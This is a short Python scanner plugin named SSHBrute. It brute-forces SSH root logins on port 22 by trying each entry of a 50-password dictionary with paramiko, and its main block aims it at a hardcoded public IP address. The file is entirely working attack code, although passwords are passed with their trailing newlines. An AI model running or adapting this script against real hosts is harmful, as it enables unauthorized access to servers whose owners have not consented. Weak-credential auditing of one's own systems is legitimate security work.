#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-
from lib.poc.Base import POC
import paramiko

from setting import user_path


class SSHBrute(POC):
    def __init__(self, ip):
        self.ip = ip

    def info(self):
        info = {
            'name': 'SSHUnauthorized',
            'level': 'high',
            'type': 'unauthorized',
        }
        return info

    def check(self):
        with open('{}/dict/pwd50.txt'.format(user_path)) as file:
            s = paramiko.SSHClient()
            s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            for password in file:
                try:
                    s.connect(hostname=self.ip, port=22, username='root', password=password, timeout=2)
                    s.close()
                    return True
                except paramiko.ssh_exception.AuthenticationException:
                    continue
                except Exception as e:
                    return False
            return False


if __name__ == '__main__':
    print(SSHBrute(ip='115.159.160.22').check())
